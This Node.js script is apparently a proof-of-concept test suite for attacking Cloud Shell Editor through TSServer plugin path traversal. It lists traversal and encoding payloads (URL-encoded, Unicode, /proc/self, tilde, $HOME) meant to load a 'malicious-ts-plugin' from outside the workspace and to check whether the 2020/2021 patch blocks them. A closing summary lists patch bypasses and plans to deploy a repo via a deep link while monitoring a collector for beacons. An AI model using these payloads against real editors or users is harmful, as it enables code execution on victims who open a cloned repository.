#!/usr/bin/env node
'use strict';

/**
 * TSServer Plugin Path Traversal — Test Script
 * =============================================
 *
 * Simulates TSServer plugin loading to verify:
 * 1. Path traversal resolution from various workspace roots
 * 2. Which plugin name values resolve to real files
 * 3. Whether the patch (VS Code 1.54 / TS 4.2) blocks our paths
 * 4. Alternative path encoding bypasses
 *
 * Usage:
 *   node test-tsserver-plugin.js [--workspace /path/to/workspace] [--verbose]
 */

const FS = require('fs');
const PATH = require('path');
const OS = require('os');

// ─── Configuration ───────────────────────────────────────────────────
const WORKSPACE_ROOTS = [
    // Cloud Shell paths
    '/home/user/cloudshell_open/evil-repo',
    '/home/user/evil-repo',
    '/home/user',
    '~',

    // Standard Linux
    OS.homedir(),
    PATH.join(OS.homedir(), 'evil-repo'),
    PATH.join(OS.homedir(), 'cloudshell_open', 'evil-repo'),

    // Current directory
    __dirname,
];

const PLUGIN_NAMES = [
    // Relative path traversal
    '.',
    '..',
    '../..',
    '../../..',
    '../../../..',
    '../../../../..',
    '../../../../../..',
    '../../../../../../..',

    // Relative traversal to home
    '../../../home/user/evil-repo/malicious-ts-plugin',
    '../../../../home/user/evil-repo/malicious-ts-plugin',
    '../../../../../home/user/evil-repo/malicious-ts-plugin',
    '../../../../../../home/user/evil-repo/malicious-ts-plugin',

    // Relative traversal to cloudshell_open
    '../../../home/user/cloudshell_open/evil-repo/malicious-ts-plugin',
    '../../../../home/user/cloudshell_open/evil-repo/malicious-ts-plugin',
    '../../../../../home/user/cloudshell_open/evil-repo/malicious-ts-plugin',
    '../../../../../../home/user/cloudshell_open/evil-repo/malicious-ts-plugin',

    // Absolute paths
    '/home/user/evil-repo/malicious-ts-plugin',
    '/home/user/cloudshell_open/evil-repo/malicious-ts-plugin',
    __filename.replace(/\.js$/, ''),

    // Tilde expansion (may or may not work in TSServer)
    '~/.ts-plugin/malicious-ts-plugin',
    '~/evil-repo/malicious-ts-plugin',

    // Same-directory
    './malicious-ts-plugin',
    '../evil-repo/malicious-ts-plugin',
    '../../evil-repo/malicious-ts-plugin',

    // Alternative path encodings (bypass attempts)
    '/home/./user/evil-repo/malicious-ts-plugin',
    '/home/user/evil-repo/./malicious-ts-plugin',
    '//home/user/evil-repo/malicious-ts-plugin',
];

// ─── Plugin Resolution Simulator ─────────────────────────────────────

/**
 * Simulates Node.js require.resolve() from a given base directory.
 * This is what TSServer does when loading plugins.
 *
 * TSServer's resolution (simplified):
 * 1. If name starts with '.' or '..' → resolve relative to workspace root
 * 2. If name starts with '/' → absolute path (may be blocked on some OS)
 * 3. Otherwise → require.resolve() from TSServer's embedded node_modules
 *
 * @param {string} pluginName - The "name" field from tsconfig.json plugins
 * @param {string} workspaceRoot - The workspace root directory
 * @param {string} pluginDir - Where the plugin JS file actually exists
 * @returns {{resolved: string|null, success: boolean, error: string|null}}
 */
function simulateRequireResolve(pluginName, workspaceRoot, pluginDir) {
    let resolved = null;

    try {
        if (pluginName.startsWith('.') || pluginName.startsWith('..')) {
            // Relative path — resolve from workspace root
            resolved = PATH.resolve(workspaceRoot, pluginName);
        } else if (pluginName.startsWith('/')) {
            // Absolute path
            resolved = pluginName;
        } else if (pluginName.startsWith('~')) {
            // Tilde expansion (Node.js doesn't do this natively — test if TSServer does)
            resolved = pluginName.replace(/^~/, OS.homedir());
        } else {
            // Bare name — require.resolve from node_modules
            // For our test: treat as relative to workspace root
            resolved = PATH.resolve(workspaceRoot, 'node_modules', pluginName);
        }

        // Add .js extension if missing
        if (resolved && !PATH.extname(resolved)) {
            resolved += '.js';
        }

        // Check if file exists
        if (FS.existsSync(resolved)) {
            const stat = FS.statSync(resolved);
            return {
                resolved,
                success: true,
                error: null,
                isFile: stat.isFile(),
                isDir: stat.isDirectory(),
            };
        } else {
            return {
                resolved,
                success: false,
                error: 'ENOENT: file not found',
                isFile: false,
                isDir: false,
            };
        }
    } catch (e) {
        return {
            resolved: resolved || null,
            success: false,
            error: e.message,
            isFile: false,
            isDir: false,
        };
    }
}

/**
 * Simulates TSServer's actual plugin loading with path validation.
 *
 * The 2020 patch (VS Code 1.54 / TypeScript 4.2) added validation:
 * - Plugin path must be within the workspace OR a trusted location
 * - Path traversal outside workspace is blocked
 * - Absolute paths may be blocked entirely
 *
 * This function checks whether the resolved path stays within the workspace.
 */
function simulateTsserverValidation(resolvedPath, workspaceRoot) {
    // Normalize both paths for comparison
    const normalizedResolved = PATH.normalize(resolvedPath);
    const normalizedWorkspace = PATH.normalize(workspaceRoot);

    // Check if resolved path is within workspace
    const relative = PATH.relative(normalizedWorkspace, normalizedResolved);
    const isWithinWorkspace = !relative.startsWith('..') && !PATH.isAbsolute(relative);

    // Check for path traversal attempts that might be caught
    const hasTraversal = resolvedPath.includes('..');

    // Check for symlink escapes (if the plugin path is a symlink outside workspace)
    let symlinkEscape = false;
    try {
        if (FS.existsSync(resolvedPath)) {
            const realPath = FS.realpathSync(resolvedPath);
            const relReal = PATH.relative(normalizedWorkspace, realPath);
            symlinkEscape = relReal.startsWith('..') || PATH.isAbsolute(relReal);
        }
    } catch (_) { /* ignore */ }

    return {
        isWithinWorkspace,
        hasTraversal,
        symlinkEscape,
        wouldBeBlockedBy2020Patch: hasTraversal && !isWithinWorkspace,
        wouldBeBlockedBySymlinkCheck: symlinkEscape,
    };
}

// ─── Alternative Path Encoding Bypass Tests ──────────────────────────

/**
 * Tests alternative path encodings that might bypass string-based checks.
 */
function testAlternativeEncodings(pluginDir, workspaceRoot) {
    console.log('\n' + '='.repeat(80));
    console.log('ALTERNATIVE PATH ENCODING BYPASS TESTS');
    console.log('='.repeat(80));

    const encodings = {
        // Unix path tricks
        'Double dot with extra slash': '../../../home/user//evil-repo/malicious-ts-plugin',
        'Dot segments': '/home/./user/./evil-repo/malicious-ts-plugin',
        'Double slash': '//home/user/evil-repo/malicious-ts-plugin',
        'Trailing slash': '/home/user/evil-repo/malicious-ts-plugin/',
        'Path with null byte': '/home/user/evil-repo/malicious-ts-plugin\x00.js',

        // /proc self tricks (Linux)
        'proc/self/cwd': '/proc/self/cwd/malicious-ts-plugin',
        'proc/self/fd': '/proc/self/fd/3',

        // Environment variable expansion (if TSServer supports it)
        'HOME env': '$HOME/evil-repo/malicious-ts-plugin',
        'HOME env brace': '${HOME}/evil-repo/malicious-ts-plugin',

        // Symlink-based
        'dev/fd': '/dev/fd/3',

        // Unicode normalization
        'Unicode traversal': '../../evil-repo/malicious-ts-plugin',
        'Full-width dots': '．．/．．/evil-repo/malicious-ts-plugin',

        // URL encoding (if TSServer decodes)
        'URL encoded': '..%2f..%2f..%2fhome%2fuser%2fevil-repo%2fmalicious-ts-plugin',
        'Double URL encoded': '..%252f..%252fhome%252fuser%252fevil-repo%252fmalicious-ts-plugin',
    };

    for (const [name, encoding] of Object.entries(encodings)) {
        const result = simulateRequireResolve(encoding, workspaceRoot, pluginDir);
        const icon = result.success ? '\x1b[32mPASS\x1b[0m' : '\x1b[31mFAIL\x1b[0m';
        console.log(`  ${icon} ${name}`);
        console.log(`       Encoding: ${encoding}`);
        console.log(`       Resolved: ${result.resolved}`);
        if (!result.success) {
            console.log(`       Error:    ${result.error}`);
        }
    }
}

// ─── Path Traversal Depth Test ───────────────────────────────────────

/**
 * Tests how many "../" are needed to escape a workspace and reach the plugin.
 */
function testTraversalDepth(pluginDir, workspaceRoot) {
    console.log('\n' + '='.repeat(80));
    console.log('PATH TRAVERSAL DEPTH TEST');
    console.log(`Workspace root: ${workspaceRoot}`);
    console.log(`Plugin dir:     ${pluginDir}`);
    console.log('='.repeat(80));

    const requiredDepth = pluginDir.split(PATH.sep).length - workspaceRoot.split(PATH.sep).length;

    for (let depth = 0; depth <= 10; depth++) {
        const traversal = '../'.repeat(depth) + 'malicious-ts-plugin'; // simplified
        const resolved = PATH.resolve(workspaceRoot, '../'.repeat(depth));
        const reachesPlugin = PATH.resolve(workspaceRoot, '../'.repeat(depth) + 'malicious-ts-plugin');
        const exists = FS.existsSync(reachesPlugin + '.js');

        const icon = exists ? '\x1b[32mHIT\x1b[0m' : '\x1b[33mMISS\x1b[0m';
        console.log(`  Depth ${String(depth).padStart(2)}: ../ x ${String(depth).padStart(2)} → ${reachesPlugin} ${icon}`);
    }

    console.log(`\n  Recommended depth: ${Math.max(3, requiredDepth)} (accounts for Cloud Shell nesting)`);
}

// ─── TSServer Patch Check ────────────────────────────────────────────

/**
 * Checks whether the 2020/2021 patches would block our paths.
 */
function testPatchEffectiveness(pluginDir, workspaceRoot) {
    console.log('\n' + '='.repeat(80));
    console.log('PATCH EFFECTIVENESS CHECK');
    console.log('Testing whether VS Code 1.54 / TypeScript 4.2 plugin path validation');
    console.log('would block our traversal payloads.');
    console.log('='.repeat(80));

    const testPaths = [
        '../../../home/user/evil-repo/malicious-ts-plugin',
        '../../../../home/user/evil-repo/malicious-ts-plugin',
        '/home/user/evil-repo/malicious-ts-plugin',
        './malicious-ts-plugin',
        '../evil-repo/malicious-ts-plugin',
    ];

    for (const name of testPaths) {
        const resolved = simulateRequireResolve(name, workspaceRoot, pluginDir);
        const validation = resolved.resolved
            ? simulateTsserverValidation(resolved.resolved, workspaceRoot)
            : { wouldBeBlockedBy2020Patch: 'N/A (no file)' };

        let status;
        if (!resolved.success) {
            status = '\x1b[33mNO FILE\x1b[0m';
        } else if (validation.wouldBeBlockedBy2020Patch) {
            status = '\x1b[31mBLOCKED\x1b[0m';
        } else if (validation.wouldBeBlockedBySymlinkCheck) {
            status = '\x1b[31mBLOCKED (symlink)\x1b[0m';
        } else {
            status = '\x1b[32mWORKS\x1b[0m';
        }

        console.log(`  ${status} ${name}`);
        console.log(`         Resolved: ${resolved.resolved}`);
        console.log(`         Within workspace: ${validation.isWithinWorkspace}`);
        console.log(`         Has traversal:    ${validation.hasTraversal}`);
    }
}

// ─── Full Resolution Matrix ──────────────────────────────────────────

/**
 * Full matrix: every workspace root x every plugin name
 */
function testFullMatrix(pluginDir) {
    console.log('\n' + '='.repeat(80));
    console.log('FULL RESOLUTION MATRIX');
    console.log(`Plugin dir: ${pluginDir}`);
    console.log('='.repeat(80));

    let totalTests = 0;
    let totalSuccesses = 0;

    for (const root of WORKSPACE_ROOTS) {
        const expandedRoot = root.startsWith('~') ? root.replace(/^~/, OS.homedir()) : root;
        if (!FS.existsSync(expandedRoot)) {
            console.log(`\n  Workspace: ${root}`);
            console.log(`    (directory does not exist — skipping)`);
            continue;
        }

        console.log(`\n  Workspace: ${root}`);
        let workspaceSuccesses = 0;

        for (const name of PLUGIN_NAMES) {
            const result = simulateRequireResolve(name, expandedRoot, pluginDir);
            totalTests++;

            if (result.success) {
                workspaceSuccesses++;
                totalSuccesses++;
            }
        }

        console.log(`    Results: ${workspaceSuccesses}/${PLUGIN_NAMES.length} plugins resolve`);
    }

    console.log(`\n  TOTAL: ${totalSuccesses}/${totalTests} plugin paths resolve successfully`);
}

// ─── Cloud Shell Specific Test ───────────────────────────────────────

function testCloudShellScenario(pluginDir) {
    console.log('\n' + '='.repeat(80));
    console.log('CLOUD SHELL SCENARIO SIMULATION');
    console.log('='.repeat(80));

    const scenarios = [
        {
            name: 'Standard deep-link clone (cloudshell_open)',
            workspaceRoot: '/home/user/cloudshell_open/evil-repo',
            tsconfigDir: '/home/user/cloudshell_open/evil-repo',
            expectedPluginPath: '/home/user/cloudshell_open/evil-repo/malicious-ts-plugin.js',
            pluginNames: [
                { name: './malicious-ts-plugin', description: 'Same directory — no traversal needed' },
                { name: '../evil-repo/malicious-ts-plugin', description: 'One level up (if workspace root is one above)' },
                { name: '../../../home/user/cloudshell_open/evil-repo/malicious-ts-plugin', description: 'Full traversal from deep nesting' },
            ],
        },
        {
            name: 'Direct clone to home',
            workspaceRoot: '/home/user/evil-repo',
            tsconfigDir: '/home/user/evil-repo',
            expectedPluginPath: '/home/user/evil-repo/malicious-ts-plugin.js',
            pluginNames: [
                { name: './malicious-ts-plugin', description: 'Same directory' },
                { name: '../evil-repo/malicious-ts-plugin', description: 'One level up' },
                { name: '../../home/user/evil-repo/malicious-ts-plugin', description: 'Two levels up from subdir' },
            ],
        },
        {
            name: 'Deep subdirectory (workspace in src/)',
            workspaceRoot: '/home/user/evil-repo',
            tsconfigDir: '/home/user/evil-repo/src',
            expectedPluginPath: '/home/user/evil-repo/malicious-ts-plugin.js',
            pluginNames: [
                { name: '../malicious-ts-plugin', description: 'One level up from src/' },
                { name: './malicious-ts-plugin', description: 'Same dir (if plugin is in src/)' },
            ],
        },
    ];

    for (const scenario of scenarios) {
        console.log(`\n  Scenario: ${scenario.name}`);
        console.log(`    Workspace root:  ${scenario.workspaceRoot}`);
        console.log(`    tsconfig.json:   ${scenario.tsconfigDir}`);
        console.log(`    Plugin location: ${scenario.expectedPluginPath}`);

        for (const { name, description } of scenario.pluginNames) {
            const result = simulateRequireResolve(name, scenario.tsconfigDir, pluginDir);
            const icon = result.success ? '\x1b[32mRESOLVES\x1b[0m' : '\x1b[31mMISSING\x1b[0m';
            console.log(`    ${icon} "${name}" → ${result.resolved} (${description})`);
        }
    }
}

// ─── File Creation Test (creates the actual dirs/files for testing) ──

function createTestFixtures(pluginDir) {
    console.log('\n' + '='.repeat(80));
    console.log('CREATING TEST FIXTURES');
    console.log('='.repeat(80));

    const fixtures = [
        PATH.join(pluginDir, 'malicious-ts-plugin.js'),
        PATH.join(pluginDir, 'tsconfig.json'),
        PATH.join(pluginDir, 'main.ts'),
        PATH.join(pluginDir, '.vscode', 'settings.json'),
    ];

    for (const fixture of fixtures) {
        const exists = FS.existsSync(fixture);
        const icon = exists ? '\x1b[32mEXISTS\x1b[0m' : '\x1b[31mMISSING\x1b[0m';
        const size = exists ? ` (${FS.statSync(fixture).size} bytes)` : '';
        console.log(`  ${icon} ${fixture}${size}`);
    }
}

// ═══════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════

const pluginDir = __dirname;
const workspaceRoot = process.argv.includes('--workspace')
    ? process.argv[process.argv.indexOf('--workspace') + 1]
    : '/home/user/cloudshell_open/evil-repo';

const verbose = process.argv.includes('--verbose');

console.log('\x1b[1;35m');
console.log('╔══════════════════════════════════════════════════════════════╗');
console.log('║     TSServer Plugin Path Traversal — PoC Test Suite          ║');
console.log('║     David Dworken 2020 Vector → Cloud Shell 2026             ║');
console.log('╚══════════════════════════════════════════════════════════════╝');
console.log('\x1b[0m');
console.log(`Plugin directory:  ${pluginDir}`);
console.log(`Workspace root:    ${workspaceRoot}`);
console.log(`Date:              ${new Date().toISOString()}`);

// Run all tests
createTestFixtures(pluginDir);
testFullMatrix(pluginDir);
testTraversalDepth(pluginDir, workspaceRoot);
testPatchEffectiveness(pluginDir, workspaceRoot);
testCloudShellScenario(pluginDir);
testAlternativeEncodings(pluginDir, workspaceRoot);

// ─── Summary ─────────────────────────────────────────────────────────
console.log('\n' + '='.repeat(80));
console.log('SUMMARY');
console.log('='.repeat(80));
console.log(`
The TSServer plugin path traversal vector leverages the fact that
TypeScript's language server loads plugins from tsconfig.json
INDEPENDENTLY of VS Code/Code OSS workspace trust.

KEY INSIGHTS:
1. TSServer starts automatically when a .ts file opens
2. TSServer reads tsconfig.json and loads plugins via require()
3. This happens BEFORE and OUTSIDE of workspace trust enforcement
4. Path traversal in plugin "name" field can load JS from outside workspace
5. The 2020 patch (VS Code 1.54) added validation but may not cover all cases

BYPASS OPPORTUNITIES:
- Symlink within workspace pointing to external file
- Plugin in workspace but with backdoor in package dependency
- TSServer restart with modified environment (env vars for path)
- Path encoding tricks (Unicode, URL encoding, /proc/self/)
- The patch validates the RESOLVED path — if resolution differs from validation...

NEXT STEPS:
1. Test against actual Cloud Shell Editor with a deployed repo
2. Use deep-link: https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=REPO_URL&cloudshell_open_in_editor=main.ts
3. Monitor collector for beacon signals
`);
